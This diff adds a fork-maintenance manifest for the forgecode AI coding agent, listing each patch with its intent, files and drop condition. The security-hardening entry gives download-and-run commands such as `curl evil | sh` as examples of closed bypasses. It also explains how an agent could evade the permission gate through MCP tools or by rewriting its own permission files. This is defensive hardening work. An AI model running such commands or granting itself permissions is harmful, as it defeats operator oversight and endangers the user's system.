@@ -1,0 +1,399 @@
+# .fork.toml -- what this fork carries on top of upstream, one entry per patch.
+#
+# The unit of fork maintenance is the patch (intent, files, drop condition),
+# not the commit. This file is the single source of truth for that list.
+# docs/fork-differences.md is GENERATED from it: edit here, then `just docs`;
+# `just docs-check` (part of `just ci`) fails when the two drift.
+#
+# No counts and no SHAs here: they rot within days. Derive them from git
+# (`git log upstream/main..mymain`, `git cherry -v upstream/main mymain`).
+#
+# Field contract, per [[patch]]:
+#   id           stable slug; commits map to a patch by the files they touch
+#                (no commit trailers: AGENTS.md forbids them)
+#   title        one line
+#   conflict     merge-conflict exposure: none | low | medium | high
+#   intent       why the fork carries it (one paragraph, markdown)
+#   details      optional longer markdown, rendered verbatim
+#   files        git pathspecs the patch owns (files may appear in two patches)
+#   upstream_pr  upstream PR URL, "" while none is open
+#   upstream_issue  upstream issue URL, "" while none is filed
+#   drop_when    the condition under which the patch can be deleted
+#   docs         prose that names this patch and must be re-read after a sync
+
+[fork]
+name = "forgecode"
+vcs = "git"
+strategy = "merge" # never rebase mymain by hand; see AGENTS.md "Git Operations"
+mirror_branch = "main"
+work_branch = "mymain"
+
+[upstream]
+url = "https://github.com/tailcallhq/forgecode"
+remote = "upstream"
+note = "Formerly antinomyhq/forgecode; GitHub redirects the old org."
+
+[origin]
+url = "git@github.com:M1lan/forgecode.git"
+remote = "origin"
+
+[verify]
+quick = "just check"
+full = "just ci-check"
+
+[hosts.torque]
+path = "~/src/forgecode"
+note = "The only working copy. Push origin/mymain only when the operator says so."
+
+[doc]
+intro = '''
+`mymain` is upstream `main`, as of the last upstream merge into `mymain`,
+plus the patches below. How far `mymain` is behind upstream right now is not
+recorded here; ask git. This page lists *patches*
+(intent, files, drop condition), not commits, and carries no counts: derive
+those from git with the commands under
+[Reproducing the comparison](#reproducing-the-comparison).
+'''
+branch_policy = '''
+- `upstream/main` is the source of truth for upstream code. Treat the local
+  `main` branch as a cached pointer at whatever was last merged; it is not
+  automatically current.
+- `mymain` is the active development branch. All local work lands here and
+  upstream is merged in periodically (`just sync-upstream`, merge, never rebase).
+- Push only to `origin`. Contributions intended for upstream go out as pull
+  requests from a branch cut off `upstream/main`, not as fork-local patches.
+- Fork-only paths (`docs/shell-parity/`, `exec-harness/`, `.beads/`) carry no
+  conflict risk. `plans/` is shared with upstream, but the fork only *adds*
+  files there and modifies none.
+'''
+
+[[patch]]
+id = "sdlc-justfile"
+title = "Justfile SDLC"
+conflict = "none"
+intent = '''
+Replace upstream's ad-hoc scripts with one `just` task runner (`Justfile` plus
+`.just/helpers/*.bash`), mise-pinned tools, typos and betterhook git hooks. One
+gate, `just ci`, fixes what is fixable (rustfmt, `clippy --fix`, typos, rumdl,
+generated docs) and then re-runs the same tools in check mode; `just ci-check`
+is the read-only form the pre-push hook runs.
+'''
+details = '''
+`docs/justfile.md` and `docs/fork-differences.md` are generated
+(`just docs`, gated by `just docs-check`). `.forge/commands/check.md` is an
+upstream file patched to point agents at `just ci` instead of raw
+`cargo fmt`/`clippy`/`insta` calls, which skip the shell, docs and spelling
+lanes; it is a very low-churn file. The zsh test helper is renamed
+`scripts/test-zsh-utils.sh` -> `.zsh` (it was always zsh; the `.sh` suffix
+dragged it into a shellcheck glob that could not read it), one upstream
+doc-comment typo in `forge_eventsource_stream` is fixed, and `Cargo.lock` carries targeted
+RUSTSEC patches.
+'''
+files = [
+  "Justfile",
+  ".just/helpers/",
+  "betterhook.toml",
+  "mise.toml",
+  "typos.toml",
+  "docs/justfile.md",
+  ".forge/commands/check.md",
+  "scripts/test-zsh-utils.zsh",
+  "crates/forge_eventsource_stream/src/lib.rs",
+  "Cargo.lock",
+]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Never: local developer interface of this fork. The typo fix drops when upstream fixes it; the RUSTSEC lock bumps drop once the upstream lockfile reaches the same versions."
+docs = ["AGENTS.md", "docs/justfile.md"]
+
+[[patch]]
+id = "installer"
+title = "Installer"
+conflict = "low"
+intent = '''
+`cli` is a forked copy of upstream's POSIX-sh installer. Upstream's
+`ensure_install_dir_shell_path()` unconditionally prepended `~/.local/bin` to
+`.bashrc` / `.zshrc` on every run, clobbering shell configurations that already
+set PATH elsewhere (for example a `path+=()` entry in `~/.zshenv`). The fork
+early-returns when the directory is already on `$PATH` or when any common
+startup file already references it.
+'''
+details = '''
+`just install` installs both `forge` (release) and `forge-debug`, builds
+incrementally, and passes `--locked` to `cargo install` so the lockfile, not a
+fresh resolve, decides dependency versions.
+'''
+files = ["cli", ".just/helpers/install.bash", ".just/helpers/install-audit.bash"]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Upstream `cli` stops editing shell RC files when PATH is already set, and upstream install docs use `cargo install --locked`."
+docs = ["README.md"]
+
+[[patch]]
+id = "frontend-protocol"
+title = "Host frontends: Emacs comint/JSON protocol, herdr self-report"
+conflict = "low"
+intent = '''
+Let a host program drive or observe Forge. A comint mode serves Emacs and dumb
+terminals; JSON frontend protocol v1 (`crates/forge_main/src/frontend/`, wire
+format in `docs/frontend-protocol.md`) lets GNU Emacs drive Forge, with a
+native selector round-trip through `forge_select`. `herdr.rs` self-reports
+agent state to the herdr terminal multiplexer via `pane.report_agent`; only a
+Forge session announces and reports.
+'''
+files = [
+  "crates/forge_main/src/frontend/",
+  "crates/forge_main/src/herdr.rs",
+  "crates/forge_main/src/cli.rs",
+  "crates/forge_main/src/lib.rs",
+  "crates/forge_main/src/main.rs",
+  "crates/forge_main/src/ui.rs",
+  "crates/forge_main/src/input.rs",
+  "crates/forge_select/",
+  "crates/forge_domain/src/console.rs",
+  "crates/forge_infra/src/console.rs",
+  "docs/frontend-protocol.md",
+]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Upstream ships an equivalent machine frontend protocol and a host-agent state hook, or the operator stops using Emacs and herdr frontends."
+docs = ["docs/frontend-protocol.md", "crates/forge_select/README.md"]
+
+[[patch]]
+id = "interactive-input"
+title = "Interactive input repairs"
+conflict = "medium"
+intent = '''
+Repair the interactive line editor: kill-line works, no ghost-text hint, and
+`:` no longer triggers completion (user-reported bug). On upstream merges keep
+the fork's intent: 2026-09-17 `input_completer.rs` conflicted only because
+upstream reflowed a comment.
+'''
+files = ["crates/forge_main/src/editor.rs", "crates/forge_main/src/completer/input_completer.rs"]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Upstream fixes kill-line and stops treating `:` as a completion trigger."
+docs = []
+
+[[patch]]
+id = "shell-plugins"
+title = "Shell plugins: bash and fish"
+conflict = "low"
+intent = '''
+`shell-plugin/` ships bash and fish ports alongside the original zsh plugin,
+wired through a `ShellKind` in `forge_main`. Parity with zsh is specified and
+checked under `docs/shell-parity/` (spec, TLA+ model, differential oracle,
+benchmarks). The bash plugin replays cleared readline input before dispatch.
+'''
+files = [
+  "shell-plugin/bash/",
+  "shell-plugin/fish/",
+  "shell-plugin/lib/helpers.zsh",
+  "shell-plugin/README.md",
+  "crates/forge_main/src/zsh/",
+  "crates/forge_main/src/cli.rs",
+  "crates/forge_main/src/ui.rs",
+  "docs/shell-parity/",
+]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Upstream ships bash and fish plugins with zsh parity."
+docs = ["shell-plugin/README.md"]
+
+[[patch]]
+id = "policy-hardening"
+title = "Security: command policy hardening"
+conflict = "high"
+intent = '''
+The largest *behavioural* divergence. Upstream ships the shell-command policy
+engine switched off and permissive; the fork turns it on and closes the
+bypasses that turning it on exposes. Remote file validation (written files
+sent over gRPC for syntax checks) is opt-in via
+`enable_remote_file_validation = false`. On Unix, commands run under Bash
+regardless of the operator's interactive `$SHELL`. The patch also carries the
+`FORGE_EXTRA_INSTRUCTIONS_PATH` hook in `instructions.rs`: a file injected as
+lowest-priority session instructions, capped at 32 KiB.
+'''
+details = '''
+- **Restricted mode is on by default.** The embedded defaults
+  (`crates/forge_config/.forge.toml`) set `restricted = true`, so the policy
+  engine is consulted for built-in tool calls. Upstream defaults to
+  `restricted = false`, which disables permission checks entirely.
+
+  Two caveats worth knowing. First, the gate does not cover everything:
+  MCP tool calls bypass `check_tool_permission` entirely, and several
+  built-ins (Task, Skill, Plan, Undo, SemSearch, Todo) map to no
+  `PermissionOperation`, so an MCP server that exposes command execution is
+  not policed by this. Second, an existing user config wins over the embedded
+  default, and Forge's config writer materialises *every* field — so any
+  install whose `.forge.toml` was written before this change has
+  `restricted = false` pinned in it and stays unrestricted until that line is
+  removed or flipped. Check with `forge info`, and edit the file that
+  `ConfigReader::base_path()` actually resolves to: `~/forge/.forge.toml`
+  when the legacy `~/forge` directory exists, otherwise `~/.forge/.forge.toml`
+  (or `$FORGE_CONFIG` when set).
+- **Commands and URL fetches confirm by default.** The default policy file
+  (`crates/forge_services/src/permissions.default.yaml`, materialised as
+  `permissions.yaml` on first use) drops upstream's blanket
+  `allow`/`command: "*"` and `allow`/`url: "*"` rules; reads and writes stay
+  allow-all. Confirmation comes from the *absence* of a rule, because
+  `PolicyEngine` already defaults to `Confirm` when nothing matches. A
+  `confirm`/`command: "*"` catch-all would be worse than useless: the engine
+  returns the first matching `Deny`/`Confirm` and discards any `Allow` it has
+  already seen, so the catch-all would shadow every allow rule — including
+  the ones "Accept and Remember" writes — and re-prompt forever. An existing
+  `permissions.yaml` is never rewritten, so installs that predate this change
+  keep their old (allow-all) file until it is deleted or edited.
+- **Forge cannot rewrite its own permissions.** The default policy denies
+  writes to `permissions.yaml` and `.forge.toml`. Without that, the write
+  allow-all would let an agent grant itself blanket command permissions — or
+  set `restricted = false` — with the ordinary write tool and never prompt.
+  `Deny` wins over `Allow` in the engine, so these rules survive the allow-all
+  that follows them.
+
+  The rules deliberately name those two files rather than denying a whole
+  `forge` / `.forge` directory: `Deny` is a hard block with no prompt, and a
+  directory rule would also block project-local `.forge/commands/*.md` and
+  `.forge/agents/*.md`. They match on file name, so they still apply under a
+  relocated `$FORGE_CONFIG`, but other files in the config directory
+  (credentials, provider config) are not covered.
+- **"Accept and Remember" stores exact commands.** Remembering an accepted
+  command writes a glob-escaped exact-match execute rule instead of the
+  upstream `<cmd> <subcmd>*` prefix glob, which also matched compound
+  commands such as `git push; curl evil | sh`.
+- **Execute rules are matched per simple command.** Commands are parsed with
+  `tree-sitter-bash` (`crates/forge_services/src/command_extract.rs`) and each
+  simple command — including those inside pipelines, `&&`/`;` lists,
+  subshells and `$()` substitutions — is matched separately, so `git *` no
+  longer auto-allows `git status && curl evil | sh`. Redirections stay
+  attached to the statement they belong to (`cargo test > ~/.bashrc` is not
+  reduced to `cargo test`), and anything the parser cannot model safely —
+  syntax errors, standalone assignments, `export`/`declare`/`unset` — falls
+  back to `Confirm` rather than being auto-allowed. On Windows, where
+  commands run through `cmd.exe` rather than a POSIX shell, the raw-string
+  verdict is kept because the bash grammar does not describe that syntax.
+'''
+files = [
+  "crates/forge_services/src/policy.rs",
+  "crates/forge_services/src/command_extract.rs",
+  "crates/forge_services/src/instructions.rs",
+  "crates/forge_services/src/lib.rs",
+  "crates/forge_services/src/permissions.default.yaml",
+  "crates/forge_services/src/tool_services/fs_write.rs",
+  "crates/forge_services/Cargo.toml",
+  "crates/forge_config/.forge.toml",
+  "crates/forge_config/src/config.rs",
+  "crates/forge_config/src/reader.rs",
+  "crates/forge_repo/src/forge_repo.rs",
+  "crates/forge_repo/src/validation.rs",
+  "crates/forge_infra/src/env.rs",
+  "forge.schema.json",
+  "Cargo.toml",
+  "Cargo.lock",
+]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "All of: upstream defaults to restricted mode; confirms commands and fetches by default; denies writes to `permissions.yaml` and `.forge.toml`; remembers accepted commands as exact-match rules; matches execute rules per simple command; makes remote file validation opt-in; runs Unix commands under Bash; offers an extra-instructions file hook like `FORGE_EXTRA_INSTRUCTIONS_PATH`. Partial upstream coverage shrinks the patch, it does not drop it."
+docs = ["docs/fork-differences.md"]
+
+[[patch]]
+id = "workflows-takeover"
+title = "CI: one fork-owned workflow"
+conflict = "medium"
+intent = '''
+The fork replaces upstream's seven generated workflows with one minimal,
+hand-written `ci.yml` it owns. `crates/forge_ci/tests/ci.rs` used to *generate*
+those workflow files; in the fork it only *asserts* that the fork-owned
+workflow directory is intact, that upstream-only workflows stay removed and
+that CI never invokes `just` (`just workflows-check`). The workspace
+`rust-version` is raised to the toolchain actually pinned and tested.
+'''
+files = [".github/workflows/", "crates/forge_ci/tests/ci.rs", "Cargo.toml"]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Never while the fork cannot publish releases; re-check if upstream stops generating workflows from forge_ci."
+docs = ["AGENTS.md"]
+
+[[patch]]
+id = "update-provider-telemetry"
+title = "Update, provider and telemetry defaults"
+conflict = "medium"
+intent = '''
+Stop upstream services from overriding a local fork build. `UpdateFrequency`
+defaults to `Never` and local builds skip the self-update check, so an
+upstream release build does not replace the fork binary. `CLAUDE_CODE_BASE_URL`
+overrides the `claude_code` provider base URL. `FORGE_TRACKER=false` becomes a
+real telemetry opt-out.
+'''
+details = '''
+- **Updates.** The embedded `.forge.toml` still ships `auto_update = true` /
+  `frequency = "daily"`, and a user config layered on top wins over both: set
+  `[updates] frequency = "never"` there to be sure a locally built binary is
+  not replaced by an upstream release build.
+- **`FORGE_TRACKER=false` is a real opt-out.** Upstream gates PostHog usage
+  events and the PostHog tracing writer (`forge_tracker/src/log.rs`) on the
+  build version only; the env var just skips the email lookup. The fork adds
+  the env check to `can_track()` (`forge_tracker/src/can_track.rs`), so the
+  opt-out stops both and tracing goes to the local `~/.forge/logs` file.
+'''
+files = [
+  "crates/forge_config/src/compact.rs",
+  "crates/forge_main/src/update.rs",
+  "crates/forge_repo/src/provider/provider_repo.rs",
+  "crates/forge_tracker/src/can_track.rs",
+  "crates/forge_tracker/src/dispatch.rs",
+]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Upstream skips self-update for local builds, honours `CLAUDE_CODE_BASE_URL` and `FORGE_TRACKER=false` for all telemetry."
+docs = []
+
+[[patch]]
+id = "display"
+title = "Display: output-loss fixes"
+conflict = "medium"
+intent = '''
+Two output-loss bugs. `CodeBlockParser` flushes an unterminated code block at
+end of stream instead of dropping it (output cut off). A paused spinner no
+longer erases streamed output (paint race; a test reproduces it).
+'''
+files = ["crates/forge_display/src/code.rs", "crates/forge_spinner/src/lib.rs"]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Upstream fixes both: unterminated code block flush and the spinner paint race."
+docs = []
+
+[[patch]]
+id = "fork-chrome"
+title = "Fork chrome"
+conflict = "low"
+intent = '''
+Agent and maintenance files that exist only for this fork: agent instructions
+(`AGENTS.md`, `CLAUDE.md`, `.claude/`, `.agents/`), `.beads/` issue tracker,
+ast-grep config (`sgconfig.yml`, `rules/`), plans, `exec-harness/`, this
+manifest and its generated doc, README fork notes, and a groomed
+`docs/tool-guidelines.md` that matches current code.
+'''
+files = [
+  "AGENTS.md",
+  "CLAUDE.md",
+  ".claude/",
+  ".agents/",
+  ".beads/",
+  ".gitignore",
+  ".fork.toml",
+  "docs/fork-differences.md",
+  "docs/tool-guidelines.md",
+  "README.md",
+  "sgconfig.yml",
+  "rules/",
+  "rule-tests/",
+  "utils/",
+  "plans/",
+  "exec-harness/",
+  "scripts/debug-follow-log.bash",
+]
+upstream_pr = ""
+upstream_issue = ""
+drop_when = "Never: fork-owned."
+docs = ["AGENTS.md", "README.md"]
